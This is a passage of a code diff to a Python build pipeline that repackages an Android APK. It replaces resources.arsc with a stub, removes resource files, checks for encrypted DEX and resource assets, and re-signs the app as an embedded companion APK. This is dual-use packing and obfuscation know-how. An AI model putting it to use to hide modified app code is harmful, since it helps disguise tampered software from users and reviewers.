+                        cb = bytearray(chunk_bytes)
+                        entry_count = struct.unpack_from('<I', cb, 12)[0]
+                        hdr_sz      = struct.unpack_from('<H', cb, 2)[0]
+                        entries_off = hdr_sz
+                        data_start  = entries_off + entry_count * 4
+                        for i in range(entry_count):
+                            off = struct.unpack_from('<I', cb, entries_off + i * 4)[0]
+                            if off == NO_ENTRY: continue
+                            entry_base = data_start + off
+                            old_key    = struct.unpack_from('<I', cb, entry_base + 4)[0]
+                            struct.pack_into('<I', cb, entry_base + 4, old_ksp_to_new.get(old_key, 0))
+                        final_chunks.append(bytes(cb))
+
+                    # Assemble package chunk
+                    type_sp_data = bytes(full_arsc[tsp_start:tsp_start+tsp_chunk_sz])
+                    chunks_data  = b''.join(final_chunks)
+                    pkg_body     = type_sp_data + new_ksp_data + chunks_data
+
+                    pkg_hdr_orig = bytearray(full_arsc[pkg_start:pkg_start+pkg_hdr_size])
+                    struct.pack_into('<I', pkg_hdr_orig, 8,   pkg_id)
+                    struct.pack_into('<I', pkg_hdr_orig, 268, pkg_hdr_size)
+                    struct.pack_into('<I', pkg_hdr_orig, 276, pkg_hdr_size + len(type_sp_data))
+                    new_pkg_size = pkg_hdr_size + len(pkg_body)
+                    struct.pack_into('<I', pkg_hdr_orig, 4, new_pkg_size)
+                    pkg_chunk = bytes(pkg_hdr_orig) + pkg_body
+
+                    total_size = 12 + len(new_gsp_data) + len(pkg_chunk)
+                    arsc_hdr = struct.pack('<HHII', 0x0002, 12, total_size, 1)
+                    return arsc_hdr + new_gsp_data + pkg_chunk
+
+                # ── Build stub ARSC ────────────────────────────────────────────
+                with zipfile.ZipFile(MOD_ASSET, 'r') as _z3sa:
+                    _full_arsc3 = _z3sa.read('resources.arsc')
+
+                _stub_arsc3 = _build_minimal_arsc_p3(_full_arsc3)
+                print(f"  Stub ARSC: {len(_stub_arsc3):,} bytes (was {len(_full_arsc3):,} bytes)")
+
+                # ── Repack APK: inject stub ARSC (ZIP_STORED) + remove non-stub res/ ──
+                _STUB_RES_KEEP3 = {
+                    'res/mipmap-hdpi/mipmap0003.png',
+                    'res/mipmap-hdpi/mipmap0002.png',
+                    'res/mipmap-hdpi/mipmap0004.png',
+                    'res/mipmap-xxhdpi/mipmap0000.png',
+                    'res/xml/xml0000.xml',
+                    'resources.arsc',
+                }
+
+                _tmp3sa = MOD_ASSET + ".p3sa"
+                _removed3 = 0
+                with zipfile.ZipFile(MOD_ASSET, 'r') as _zin3sa, \
+                     zipfile.ZipFile(_tmp3sa, 'w', allowZip64=False) as _zout3sa:
+                    for _item3 in _zin3sa.infolist():
+                        # Remove non-stub res/ files
+                        if (_item3.filename.startswith('res/') and
+                                _item3.filename not in _STUB_RES_KEEP3):
+                            _removed3 += 1
+                            continue
+                        # Replace resources.arsc with stub — ZIP_STORED
+                        if _item3.filename == 'resources.arsc':
+                            _info3 = zipfile.ZipInfo('resources.arsc')
+                            _info3.compress_type = zipfile.ZIP_STORED
+                            _info3.date_time = _item3.date_time
+                            _zout3sa.writestr(_info3, _stub_arsc3)
+                            continue
+                        # Keep all other entries as-is
+                        _raw3 = _zin3sa.read(_item3.filename)
+                        _info3 = zipfile.ZipInfo(_item3.filename)
+                        _info3.compress_type = _item3.compress_type
+                        _info3.date_time = _item3.date_time
+                        _info3.external_attr = _item3.external_attr
+                        _zout3sa.writestr(_info3, _raw3)
+
+                os.replace(_tmp3sa, MOD_ASSET)
+                print(f"  Removed {_removed3} non-stub res/ files")
+                print(f"  ✅ STEP_STUB_ARSC — resources.arsc replaced ({len(_stub_arsc3):,} bytes, ZIP_STORED)")
+
+            except Exception as _e3sa:
+                print(f"  ❌ STEP_STUB_ARSC failed: {_e3sa}")
+                if os.path.isfile(MOD_ASSET + ".p3sa"):
+                    os.remove(MOD_ASSET + ".p3sa")
+                raise
+
+        # ── STEP_RESIGN_PHASE3 ────────────────────────────────────────────────
+        # Re-sign MOD_ASSET after all Phase 3 structural changes.
+        # (DEX replaced, assets/classes.dex.enc added, assets/res.pack.enc added,
+        #  resources.arsc replaced with stub, non-stub res/ removed)
+        with track("SIGNING", "STEP_RESIGN_PHASE3",
+                   "Re-sign companion V1+V2+V3 after Phase 3 DEX+resource protection", MOD_ASSET):
+            step_sign(input_apk=MOD_ASSET)
+
+        with track("PHASE_1", "STEP_14_ASSET_PHASE3",
+                   "Replace companion.apk in assets after Phase 3 re-sign [Step 14]", MOD_ASSET):
+            step_replace_asset()
+
+        # Verify Phase 3 results
+        with zipfile.ZipFile(MOD_ASSET, 'r') as _z3v:
+            _names3v = _z3v.namelist()
+        _has_dex_enc  = "assets/classes.dex.enc" in _names3v
+        _has_res_enc  = "assets/res.pack.enc" in _names3v
+        _dex_info3    = next((i for i in zipfile.ZipFile(MOD_ASSET).infolist() if i.filename == "classes.dex"), None)
+        _dex_stored   = _dex_info3 and _dex_info3.compress_type == zipfile.ZIP_STORED if _dex_info3 else False
+        print(f"\n  ── Phase 3 verification ──────────────────────────────────")
+        print(f"  assets/classes.dex.enc : {'✅ present' if _has_dex_enc else '❌ MISSING'}")
+        print(f"  assets/res.pack.enc    : {'✅ present' if _has_res_enc else '❌ MISSING'}")
+        print(f"  classes.dex ZIP_STORED : {'✅ yes' if _dex_stored else '❌ DEFLATED (ART BUG!)'}")
+        print(f"  ──────────────────────────────────────────────────────────")
 
     # ── PRE-ENCRYPT SNAPSHOT: Save testable companion APK for CI artifact ────
     # This copy is saved AFTER all pipeline steps (package rename, class rename,
